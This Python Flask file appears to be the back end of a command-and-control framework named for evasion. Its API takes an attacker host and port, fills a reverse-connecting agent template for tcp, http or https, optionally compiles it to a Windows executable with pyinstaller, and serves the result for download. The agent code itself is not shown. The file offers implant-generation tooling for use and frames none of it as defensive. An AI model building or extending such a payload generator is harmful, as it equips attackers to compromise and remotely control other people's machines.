from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import os
import subprocess
import uuid
import logging

app = Flask(__name__)
CORS(app, resources={r"/api/*": {"origins": "*"}})

app.config['UPLOAD_FOLDER'] = r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\generated_payloads'


# Ensure these directories are correct and accessible
payload_dir = r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\generated_payloads'
template_dir = r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\back-end'
os.makedirs(payload_dir, exist_ok=True)

@app.route('/download/<filename>')
def download_payload(filename):
    try:
        # Log the requested filename for download
        print(f"Requested filename for download: {filename}")

        # Securely join the filename to the uploads folder
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        print(f"Constructed filepath: {filepath}")

        # Check if the file exists
        if not os.path.exists(filepath):
            print(f"File not found: {filepath}")  # Changed to print for visibility in console
            return jsonify({"error": "File not found"}), 404

        # Print the directory and filename being sent
        print(f"Sending file from directory: {app.config['UPLOAD_FOLDER']} with filename: {filename}")

        # Use send_from_directory with the corrected parameters
        return send_from_directory(directory=app.config['UPLOAD_FOLDER'], path=filename, as_attachment=True)
    except Exception as e:
        # Print the exception if the file download fails
        print("Failed to download file:", e)
        return jsonify({"error": "Internal server error"}), 500


@app.route('/api/generate-payload', methods=['POST'])
def generate_payload():
    logging.info("Generating payload...")
    try:
        data = request.get_json()
        if not data or not all(key in data for key in ["name", "lhost", "lport", "type", "protocol"]):
            logging.error("Missing required fields")
            return jsonify({"error": "Missing required fields"}), 400
        
        name, lhost, lport, payload_type, protocol = data["name"], data["lhost"], data["lport"], data["type"], data["protocol"]

        if payload_type not in ['.py', '.exe'] or protocol not in ['tcp', 'http', 'https']:
            logging.error("Invalid type or protocol specified")
            return jsonify({"error": "Invalid type or protocol specified"}), 400

        template_file = os.path.join(template_dir, "templates", f"{protocol}_agent_template.py")
        if not os.path.exists(template_file):
            logging.error("Template file does not exist")
            return jsonify({"error": "Template file does not exist"}), 400

        with open(template_file, 'r') as f:
            template_content = f.read()

        filled_content = template_content.format(lhost=lhost, lport=lport)
        unique_id = str(uuid.uuid4())
        temp_filename = f"{name}_{unique_id}.py"
        temp_filepath = os.path.join(payload_dir, temp_filename)
        with open(temp_filepath, 'w') as temp_file:
            temp_file.write(filled_content)

        final_path = temp_filepath
        if payload_type == '.exe':
            subprocess.run(['pyinstaller', '--onefile', '--distpath', payload_dir, '--name', f"{name}_{unique_id}", temp_filepath], check=True)
            os.remove(temp_filepath)  # Remove the .py file after conversion
            final_path = os.path.join(payload_dir, f"{name}_{unique_id}.exe")

        download_url = request.url_root + 'download/' + os.path.basename(final_path)
        return jsonify({"message": "Payload generated successfully", "downloadUrl": download_url})

    except Exception as e:
        logging.exception("Error generating payload")
        return jsonify({"error": "Internal server error"}), 500

if __name__ == "__main__":
    app.run(debug=True, port=5002)
